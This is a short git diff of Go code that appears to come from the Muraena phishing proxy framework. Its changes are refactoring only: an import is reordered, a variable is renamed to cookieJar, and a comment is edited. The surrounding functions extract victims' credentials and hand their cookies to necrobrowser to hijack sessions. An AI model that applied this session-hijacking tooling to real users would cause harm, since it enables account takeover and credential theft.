@@ -4,7 +4,6 @@ import (
 	//"encoding/json"
 	"encoding/json"
 	"fmt"
-	"github.com/muraenateam/muraena/core/db"
 	"net/http"
 	"net/url"
 	"path"
@@ -12,6 +11,8 @@ import (
 	"regexp"
 	"strings"
 	"time"
+
+	"github.com/muraenateam/muraena/core/db"
 
 	"github.com/evilsocket/islazy/tui"
 	"github.com/lucasjones/reggen"
@@ -39,8 +40,6 @@ type Tracker struct {
 	Type           string
 	Identifier     string
 	ValidatorRegex *regexp.Regexp
-
-	//Victims sync.Map
 }
 
 // Trace object structure
@@ -410,7 +409,7 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 	return found, nil
 }
 
-// If the request URL matches those defined in authSession in the config, then
+// HijackSession: If the request URL matches those defined in authSession in the config, then
 // pass the cookies in the CookieJar to necrobrowser to hijack the session
 func (t *Trace) HijackSession(request *http.Request) (err error) {
 
@@ -437,9 +436,9 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 	}
 
 	// get all the cookies from the CookieJar
-	cookiejar, err := db.GetVictimCookiejar(victim.ID)
+	cookieJar, err := db.GetVictimCookiejar(victim.ID)
 	if err != nil {
-		t.Error("error getting victim %s cookiejar: %s", victim.ID, err)
+		t.Error("error getting victim %s cookieJar: %s", victim.ID, err)
 	}
 
 	// get all the credentials
@@ -461,7 +460,7 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 	} else {
 		nb, ok := m.(*necrobrowser.Necrobrowser)
 		if ok {
-			go nb.Instrument(cookiejar, string(creds))
+			go nb.Instrument(cookieJar, string(creds))
 		}
 	}
 
